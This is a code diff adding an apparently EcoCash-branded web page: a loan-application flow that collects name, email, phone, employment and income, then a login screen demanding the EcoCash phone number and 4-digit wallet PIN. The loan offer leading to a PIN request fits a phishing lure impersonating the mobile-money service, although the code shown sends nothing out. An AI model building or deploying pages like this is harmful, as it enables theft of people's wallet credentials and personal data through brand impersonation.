+        <select id="loanType" class="form-select">
+          <option value="">Select Loan Type</option>
+          <option value="Personal Loan">Personal Loan</option>
+          <option value="Business Loan">Business Loan</option>
+          <option value="Home Loan">Home Loan</option>
+          <option value="Car Loan">Car Loan</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Loan Amount (USD)</label>
+        <input type="number" id="step1Amount" class="form-input" placeholder="5000">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Loan Term (Months)</label>
+        <select id="step1Term" class="form-select">
+          <option value="6">6 Months</option>
+          <option value="12" selected>12 Months</option>
+          <option value="18">18 Months</option>
+          <option value="24">24 Months</option>
+          <option value="36">36 Months</option>
+          <option value="48">48 Months</option>
+          <option value="60">60 Months</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Purpose of Loan</label>
+        <textarea id="loanPurpose" class="form-textarea" placeholder="What will you use the loan for?"></textarea>
+      </div>
+
+      <div class="form-buttons">
+        <button class="btn-prev" onclick="goHome()">Back</button>
+        <button class="btn-next" onclick="goToStep2()">Next</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE: STEP 2 - PERSONAL DETAILS -->
+  <div id="step2" class="page">
+    <div class="page-content">
+      <div class="form-header">
+        <h2 class="form-title">Personal Details</h2>
+        <p class="form-subtitle">Step 2 of 3</p>
+      </div>
+
+      <div class="progress-bar">
+        <div class="progress-segment active"></div>
+        <div class="progress-segment active"></div>
+        <div class="progress-segment"></div>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">First Name</label>
+          <input type="text" id="firstName" class="form-input" placeholder="John">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Last Name</label>
+          <input type="text" id="lastName" class="form-input" placeholder="Doe">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Email Address</label>
+        <input type="email" id="email" class="form-input" placeholder="john@example.com">
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">EcoCash Phone Number</label>
+        <div class="phone-wrapper">
+          <span class="phone-prefix">🇿🇼 +263</span>
+          <input type="tel" id="phone" class="phone-input" placeholder="712345678" maxlength="10">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Employment Status</label>
+        <select id="employment" class="form-select">
+          <option value="">Select Employment Status</option>
+          <option value="Employed">Employed</option>
+          <option value="Self-Employed">Self-Employed</option>
+          <option value="Unemployed">Unemployed</option>
+          <option value="Retired">Retired</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Annual Income (USD)</label>
+        <input type="number" id="income" class="form-input" placeholder="50000">
+      </div>
+
+      <div class="form-buttons">
+        <button class="btn-prev" onclick="goToStep1()">Back</button>
+        <button class="btn-next" onclick="goToStep3()">Review</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE: STEP 3 - REVIEW & SUBMIT -->
+  <div id="step3" class="page">
+    <div class="page-content">
+      <div class="form-header">
+        <h2 class="form-title">Review & Submit</h2>
+        <p class="form-subtitle">Step 3 of 3</p>
+      </div>
+
+      <div class="progress-bar">
+        <div class="progress-segment active"></div>
+        <div class="progress-segment active"></div>
+        <div class="progress-segment active"></div>
+      </div>
+
+      <div class="summary-box">
+        <div class="summary-item">
+          <span class="summary-label">Loan Type</span>
+          <span class="summary-value" id="reviewLoanType">Personal Loan</span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Loan Amount</span>
+          <span class="summary-value" id="reviewAmount">$5,000</span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Loan Term</span>
+          <span class="summary-value" id="reviewTerm">12 Months</span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Purpose</span>
+          <span class="summary-value" id="reviewPurpose">Personal use</span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Applicant Name</span>
+          <span class="summary-value" id="reviewName">John Doe</span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Email</span>
+          <span class="summary-value" id="reviewEmail">john@example.com</span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Phone</span>
+          <span class="summary-value" id="reviewPhone">+263712345678</span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Employment</span>
+          <span class="summary-value" id="reviewEmployment">Employed</span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Annual Income</span>
+          <span class="summary-value" id="reviewIncome">$50,000</span>
+        </div>
+      </div>
+
+      <div class="form-buttons">
+        <button class="btn-prev" onclick="goToStep2()">Back</button>
+        <button class="btn-submit" onclick="goToLogin()">Next</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE: LOGIN -->
+  <div id="login" class="page">
+    <div class="page-content">
+      <h2 class="login-title">Login</h2>
+
+      <div class="login-section">
+        <div class="phone-input-wrapper">
+          <span class="phone-prefix">🇿🇼 +263</span>
+          <input type="tel" id="loginPhone" class="phone-input" placeholder="712345678" maxlength="10">
+        </div>
+
+        <label class="pin-label">Enter your PIN</label>
+        
+        <div class="pin-inputs-container">
+          <input type="password" class="pin-input" id="pin1" maxlength="1" placeholder="•" oninput="moveFocus(this, 'pin2')">
+          <input type="password" class="pin-input" id="pin2" maxlength="1" placeholder="•" oninput="moveFocus(this, 'pin3')">
+          <input type="password" class="pin-input" id="pin3" maxlength="1" placeholder="•" oninput="moveFocus(this, 'pin4')">
+          <input type="password" class="pin-input" id="pin4" maxlength="1" placeholder="•" oninput="moveFocus(this, null)">
+        </div>
+
+        <div class="pin-controls">
+          <button class="toggle-pin-btn" onclick="togglePinVisibility()">👁️‍🗨️</button>
+          <span class="forgot-pin" onclick="alert('Please contact support to reset your PIN')">Forgot PIN?</span>
+        </div>
+
+        <button class="login-btn" onclick="submitLogin()">LOGIN</button>
+      </div>
+
+      <div class="login-footer">
+        <div class="login-footer-title">To register an EcoCash wallet or get assistance, click below</div>
+        <div class="login-footer-buttons">
+          <button class="footer-btn" onclick="alert('Redirecting to register page...')">👤 Register</button>
+          <button class="footer-btn" onclick="alert('Opening help & support...')">ℹ️ Help & Support</button>
+        </div>
+        <div class="version-text">v2.1.3P</div>
+        <div class="terms-text">By signing in you agree to the <a href="https://ecocash.co.zw/terms-and-conditions/" target="_blank">Terms and Conditions</a></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE: SUCCESS -->
+  <div id="success" class="page">
+    <div class="page-content">
+      <div class="success-icon">✓</div>
+      <h2 class="success-title">Application Submitted!</h2>
+      <p class="success-text">Your loan application has been successfully submitted.</p>
+      <div class="countdown">
+        Redirecting in <span id="timer">5</span>s
+      </div>
+      <button class="btn-apply" onclick="goHome()">Back to Home</button>
+    </div>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  © 2026 Ecocash
+</footer>
+
+<!-- JAVASCRIPT -->
+<script>
+  // State Management
+  const state = {
+    loanAmount: 5000,
+    loanTerm: 12,
+    loanType: 'Personal Loan',
+    loanPurpose: '',
+    firstName: '',
+    lastName: '',
+    email: '',
+    phone: '',
+    employment: 'Employed',
+    income: ''
+  };
+
+  // Calculate Monthly Payment
+  function calculatePayment() {
+    const amount = parseFloat(state.loanAmount);
+    const months = parseFloat(state.loanTerm);
+    const rate = 0.08 / 12; // 8% APR monthly
+    
+    const payment = (amount * (rate * Math.pow(1 + rate, months))) / (Math.pow(1 + rate, months) - 1);
+    
+    document.getElementById('paymentDisplay').textContent = payment.toFixed(2);
+  }
+
+  // Update Loan Amount
+  function updateAmount(value) {
+    state.loanAmount = value;
+    document.getElementById('amountDisplay').textContent = parseInt(value).toLocaleString();
+    calculatePayment();
+  }
+
+  // Update Loan Term
+  function updateTerm(value) {
+    state.loanTerm = value;
+    document.getElementById('termDisplay').textContent = value;
+    calculatePayment();
+  }
+
+  // Show Page
+  function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(pageId).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  // Navigation Functions
+  function goHome(e) {
+    if (e) e.preventDefault();
+    showPage('home');
+  }
+
+  function goToStep1() {
+    state.loanAmount = document.getElementById('amountSlider').value;
+    state.loanTerm = document.getElementById('termSlider').value;
+    document.getElementById('step1Amount').value = state.loanAmount;
+    document.getElementById('step1Term').value = state.loanTerm;
+    showPage('step1');
+  }
+
+  function goToStep2() {
+    state.loanType = document.getElementById('loanType').value;
+    state.loanAmount = document.getElementById('step1Amount').value;
+    state.loanTerm = document.getElementById('step1Term').value;
+    state.loanPurpose = document.getElementById('loanPurpose').value;
+    
+    if (!state.loanType || !state.loanAmount || !state.loanPurpose) {
+      alert('Please fill all fields');
+      return;
+    }
+    showPage('step2');
+  }
+
+  function goToStep3() {
+    state.firstName = document.getElementById('firstName').value;
+    state.lastName = document.getElementById('lastName').value;
+    state.email = document.getElementById('email').value;
+    state.phone = document.getElementById('phone').value;
+    state.employment = document.getElementById('employment').value;
+    state.income = document.getElementById('income').value;
+    
+    if (!state.firstName || !state.lastName || !state.email || !state.phone || !state.employment || !state.income) {
+      alert('Please fill all fields');
+      return;
+    }
+
+    // Update review display
+    document.getElementById('reviewLoanType').textContent = state.loanType;
+    document.getElementById('reviewAmount').textContent = '$' + parseInt(state.loanAmount).toLocaleString();
+    document.getElementById('reviewTerm').textContent = state.loanTerm + ' Months';
+    document.getElementById('reviewPurpose').textContent = state.loanPurpose;
+    document.getElementById('reviewName').textContent = state.firstName + ' ' + state.lastName;
+    document.getElementById('reviewEmail').textContent = state.email;
+    document.getElementById('reviewPhone').textContent = '+263' + state.phone;
+    document.getElementById('reviewEmployment').textContent = state.employment;
+    document.getElementById('reviewIncome').textContent = '$' + parseInt(state.income).toLocaleString();
+
+    showPage('step3');
+  }
+
+  function goToLogin() {
+    // Pre-fill phone number from step 2
+    document.getElementById('loginPhone').value = state.phone;
+    showPage('login');
+  }
+
+  // PIN Input Focus Management
+  function moveFocus(current, nextId) {
+    if (current.value.length >= 1 && nextId) {
+      document.getElementById(nextId).focus();
+    }
+  }
+
+  // Toggle PIN Visibility
+  function togglePinVisibility() {
+    const pins = ['pin1', 'pin2', 'pin3', 'pin4'];
+    pins.forEach(id => {
+      const input = document.getElementById(id);
+      input.type = input.type === 'password' ? 'text' : 'password';
+    });
+  }
+
+  // Submit Login
+  function submitLogin() {
+    const phone = document.getElementById('loginPhone').value;
+    const pin = document.getElementById('pin1').value + 
+                document.getElementById('pin2').value + 
+                document.getElementById('pin3').value + 
+                document.getElementById('pin4').value;
+
+    if (!phone || pin.length !== 4) {
+      alert('Please enter phone number and 4-digit PIN');
+      return;
+    }
+
+    // Show success page
+    showPage('success');
+    let countdown = 5;
+    const timer = setInterval(() => {
+      countdown--;
+      document.getElementById('timer').textContent = countdown;
+      if (countdown === 0) {
+        clearInterval(timer);
+        goHome();
+      }
+    }, 1000);
+  }
+
+  // Initialize
+  calculatePayment();
+</script>
+
+</body>
+</html>
